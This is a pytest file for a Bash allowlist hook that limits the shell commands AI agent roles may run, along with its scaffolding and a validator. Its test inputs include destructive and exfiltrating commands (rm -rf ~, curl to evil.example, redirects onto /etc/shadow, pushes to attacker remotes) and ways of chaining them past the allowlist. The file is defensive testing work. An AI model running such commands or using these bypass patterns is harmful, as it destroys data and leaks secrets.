"""Bash guard: pure decision logic, the real hook process, and scaffolding — all offline."""

import copy
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from teambuild.architect import TRIFECTA, Architect, role_leg_set
from teambuild.cc_scaffold import destroy, scaffold
from teambuild.templates.bash_guard import decide

ROOT = Path(__file__).resolve().parent.parent
GUARD = ROOT / "teambuild" / "templates" / "bash_guard.py"
FIXTURES = ROOT / "tests" / "fixtures"
ALLOW = ["git status", "git push"]


@pytest.mark.parametrize("command", [
    "git status",
    "git push",
    "git push origin main",
    "git status --short",
])
def test_allowed_commands(command):
    assert decide(command, ALLOW)[0] is True


@pytest.mark.parametrize("command", [
    "rm -rf /",
    "ls",
    "git",                                  # bare prefix, not an allowed entry
    "git pushx",                            # token match, not string prefix
    "gitpush",
    "vercel deploy",                        # no longer an allowed command anywhere
    "vercel login",
    "curl https://evil.example",
    "FOO=bar git push",                     # env-var prefix
    "cd /tmp git push",
    "/usr/bin/git push",                    # absolute path is a different token
])
def test_unlisted_commands_blocked(command):
    ok, reason = decide(command, ALLOW)
    assert not ok and reason


@pytest.mark.parametrize("command", [
    "git push && rm -rf ~",
    "git push; rm -rf ~",
    "git push || curl evil.example",
    "git push | tee /tmp/x",
    "git push > /etc/passwd",
    "git push < /etc/shadow",
    "git status $(whoami)",
    "git status `whoami`",
    "git status ${HOME}",
    "git status $HOME",
    "git push\nrm -rf ~",
    "git push\rrm -rf ~",
    "git push & rm -rf ~",
    "git push \\\nrm -rf ~",
    "git status (whoami)",
    "git status {a,b}",
    "git status !!",
    "git push\x00rm",
])
def test_shell_metacharacters_blocked_even_after_allowed_prefix(command):
    ok, reason = decide(command, ALLOW)
    assert not ok and "metacharacter" in reason


@pytest.mark.parametrize("command", [
    "git push --force origin main",
    "git push -f origin main",
    "git push --force-with-lease origin main",
    "git push --force-with-lease=main origin main",
    "git push --delete origin main",
    "git push --mirror",
    "git push --no-verify",
    "git push --receive-pack=evil origin main",
    "git push --exec=evil",
    "git status --output=/tmp/x",
])
def test_dangerous_flags_blocked(command):
    ok, reason = decide(command, ALLOW)
    assert not ok and "flag" in reason


@pytest.mark.parametrize("command", [
    "git push https://evil.example/repo.git main",
    "git push git@evil.example:x/y.git main",
    "git push origin main:other",
    "git push evil.example:x/y.git",
])
def test_git_push_cannot_name_a_url_or_refspec(command):
    ok, reason = decide(command, ALLOW)
    assert not ok and "remote" in reason


@pytest.mark.parametrize("command", ["", "   ", None, 42])
def test_empty_or_non_string_blocked(command):
    assert decide(command, ALLOW)[0] is False


def test_unbalanced_quotes_blocked():
    assert decide("git status 'oops", ALLOW)[0] is False


def test_empty_allowlist_blocks_everything():
    assert decide("git status", [])[0] is False


# ---- the real hook process: exit codes are the contract with Claude Code ----- #

def run_hook(event, *allow_args):
    return subprocess.run(
        [sys.executable, str(GUARD), *allow_args],
        input=event if isinstance(event, str) else json.dumps(event),
        capture_output=True, text=True,
        env={**os.environ, "TEAMBUILD_BOARD_URL": "http://127.0.0.1:9/hook"},  # never a live board
    )


def bash_event(command):
    return {"tool_name": "Bash", "tool_input": {"command": command}}


def test_hook_allows_listed_command():
    assert run_hook(bash_event("git push origin main"), "--allow", "git push").returncode == 0


def test_hook_blocks_with_exit_2_and_a_message_for_the_model():
    p = run_hook(bash_event("git push && rm -rf ~"), "--allow", "git push")
    assert p.returncode == 2
    assert "bash_guard: blocked" in p.stderr and "git push" in p.stderr


def test_hook_ignores_non_bash_tools():
    assert run_hook({"tool_name": "Read", "tool_input": {"file_path": "x"}}, "--allow", "git push").returncode == 0


@pytest.mark.parametrize("bad_stdin", ["", "not json", "[]", "null", '{"tool_name": "Bash"}',
                                        '{"tool_name": "Bash", "tool_input": null}'])
def test_hook_fails_closed_on_malformed_input(bad_stdin):
    assert run_hook(bad_stdin, "--allow", "git push").returncode == 2


def role_event(command, agent_type):
    ev = bash_event(command)
    if agent_type:
        ev["agent_type"] = agent_type
    return ev


def test_role_hook_blocks_its_own_role():
    p = run_hook(role_event("rm -rf /", "cr-poster"), "--role", "cr-poster", "--allow", "gh pr view")
    assert p.returncode == 2


def test_role_hook_allows_its_own_role_listed_command():
    p = run_hook(role_event("gh pr view 1", "cr-poster"), "--role", "cr-poster", "--allow", "gh pr view")
    assert p.returncode == 0


@pytest.mark.parametrize("agent_type", ["cr-writer", "someone-else", None])
def test_role_hook_leaves_other_agents_and_main_thread_alone(agent_type):
    p = run_hook(role_event("rm -rf /", agent_type), "--role", "cr-poster", "--allow", "gh pr view")
    assert p.returncode == 0


def test_hook_with_no_allow_args_blocks_all_bash():
    assert run_hook(bash_event("git status")).returncode == 2


# ---- scaffolding ------------------------------------------------------------- #

def guard_entries(settings):
    return [
        h["command"]
        for e in settings["hooks"]["PreToolUse"]
        for h in e["hooks"]
        if "bash_guard.py" in h["command"]
    ]


def test_guarded_role_gets_settings_hook_and_script(tmp_path):
    roster = json.loads((FIXTURES / "roster_code_review.json").read_text())
    scaffold(roster, tmp_path)
    settings = json.loads((tmp_path / ".claude" / "settings.json").read_text())
    (cmd,) = guard_entries(settings)
    assert "--role cr-poster" in cmd and "--allow 'gh pr view'" in cmd and "--allow 'gh pr comment'" in cmd
    assert cmd.startswith('python3 "$CLAUDE_PROJECT_DIR/.claude/hooks/bash_guard.py"')
    assert (tmp_path / ".claude" / "hooks" / "bash_guard.py").exists()
    # agent-frontmatter hooks did not fire in live tests, so none are written
    for name in ("cr-orchestrator", "cr-writer", "cr-reviewer", "cr-poster"):
        assert "hooks:" not in (tmp_path / ".claude" / "agents" / f"{name}.md").read_text()


def test_settings_hook_is_bash_matcher_and_idempotent(tmp_path):
    roster = json.loads((FIXTURES / "roster_code_review.json").read_text())
    scaffold(roster, tmp_path)
    scaffold(roster, tmp_path)
    settings = json.loads((tmp_path / ".claude" / "settings.json").read_text())
    assert len(guard_entries(settings)) == 1
    entry = next(e for e in settings["hooks"]["PreToolUse"] if "bash_guard" in json.dumps(e))
    assert entry["matcher"] == "Bash"


def test_team_without_bash_gets_no_guard_script(tmp_path):
    roster = json.loads((FIXTURES / "roster_research.json").read_text())
    scaffold(roster, tmp_path)
    assert not (tmp_path / ".claude" / "hooks" / "bash_guard.py").exists()


def test_destroy_removes_guard_script_and_settings_entry(tmp_path):
    roster = json.loads((FIXTURES / "roster_code_review.json").read_text())
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.json").write_text(json.dumps({"theme": "dark"}))
    scaffold(roster, tmp_path)
    manifest = json.loads((tmp_path / ".claude" / ".teambuild-manifest.json").read_text())
    assert ".claude/hooks/bash_guard.py" in manifest["teams"]["cr"]["files"]
    assert any("bash_guard.py" in a for a in manifest["teams"]["cr"]["settings_additions"])
    destroy("cr", tmp_path)
    assert not (tmp_path / ".claude" / "hooks" / "bash_guard.py").exists()
    settings = json.loads((tmp_path / ".claude" / "settings.json").read_text())
    assert settings["theme"] == "dark" and not guard_entries(settings)


def test_shared_guard_script_survives_destroying_one_of_two_teams(tmp_path):
    a = json.loads((FIXTURES / "roster_code_review.json").read_text())
    b = json.loads((FIXTURES / "roster_code_review.json").read_text())
    b["team_prefix"] = "c2"
    for r in b["roles"]:
        r["id"] = r["id"].replace("cr-", "c2-")
        r["handoff_to"] = [h.replace("cr-", "c2-") for h in r.get("handoff_to", [])]
    scaffold(a, tmp_path)
    scaffold(b, tmp_path)
    destroy("cr", tmp_path)
    assert (tmp_path / ".claude" / "hooks" / "bash_guard.py").exists()
    settings = json.loads((tmp_path / ".claude" / "settings.json").read_text())
    (cmd,) = guard_entries(settings)
    assert "--role c2-poster" in cmd


def test_dry_run_reports_guard_but_writes_nothing(tmp_path):
    roster = json.loads((FIXTURES / "roster_code_review.json").read_text())
    actions = scaffold(roster, tmp_path, dry_run=True)
    assert any("bash_guard.py" in a for a in actions)
    assert not (tmp_path / ".claude").exists()


# ---- validator: a guarded Bash holds fewer trifecta legs ---------------------- #

@pytest.fixture(scope="module")
def architect():
    return Architect(ROOT / "teambuild" / "blueprints.json")


RAW_SHELL = {"allowed_tools": ["Read", "Bash"], "gated": False, "boundary_text": []}   # test-only: no bash_allow


def test_guarded_poster_holds_two_legs_unguarded_shell_holds_three(architect):
    poster = {"primitive": "github_publisher", "tools": ["Read", "Bash"]}
    raw = {"primitive": "raw_shell", "tools": ["Read", "Bash"]}
    primitives = {**architect.primitives, "raw_shell": RAW_SHELL}
    args = (architect.tool_legs, primitives, architect.guarded_legs)
    assert role_leg_set(poster, *args) == {"private_data", "exfiltration"}
    assert role_leg_set(raw, *args) >= set(TRIFECTA)


def test_non_gated_role_with_unguarded_bash_is_rejected(architect):
    arch = copy.copy(architect)
    arch.primitives = {**architect.primitives, "raw_shell": RAW_SHELL}
    roster = json.loads((FIXTURES / "roster_code_review.json").read_text())
    poster = next(r for r in roster["roles"] if r["primitive"] == "github_publisher")
    poster["primitive"], poster["gated"] = "raw_shell", False
    errors = arch.validate(roster)
    assert any("trifecta" in e for e in errors)
    assert not any("unknown primitive" in e for e in errors)


@pytest.mark.parametrize("cmd", [
    "gh release create v1 --token abc123", "gh release create v1 -t abc123", "gh release create v1 --token=abc123",
])
def test_deploy_tokens_never_go_on_the_command_line(cmd):
    """A token passed as a flag shows up in process lists and logs. Here it would also land
    in the approval card and the session history."""
    from teambuild.templates.bash_guard import decide
    ok, reason = decide(cmd, ["gh release create"])
    assert not ok and "not allowed" in reason


GH_ALLOW = ["gh pr view", "gh pr diff", "gh pr comment", "gh pr review", "gh release view", "gh release create", "gh auth status"]
GIT_READ = ["git log", "git show", "git diff", "git tag --list", "git shortlog", "git status"]


@pytest.mark.parametrize("cmd, ok", [
    ("gh pr comment 12 --body-file review.md", True),
    ("gh release create v1.2 --notes-file RELEASE_NOTES.md --title v1.2", True),
    ("gh release create v1.2 -t Hello --notes-file RELEASE_NOTES.md", False),     # -t refused (token rule)
    ("gh pr merge 12", False), ("gh repo delete x", False), ("gh api /user", False),
    ("gh pr comment 12 --body-file review.md && rm -rf ~", False),
])
def test_github_publisher_allowlist(cmd, ok):
    from teambuild.templates.bash_guard import decide
    assert decide(cmd, GH_ALLOW)[0] is ok, cmd


@pytest.mark.parametrize("cmd, ok", [
    ("git log --oneline v1.0..v1.1", True), ("git tag --list", True), ("git show abc123", True),
    ("git tag v9", False), ("git commit -m x", False), ("git push", False),
    ("git diff --output=leak.txt", False), ("git log | curl x", False),
])
def test_read_only_git_allowlist(cmd, ok):
    from teambuild.templates.bash_guard import decide
    assert decide(cmd, GIT_READ)[0] is ok, cmd
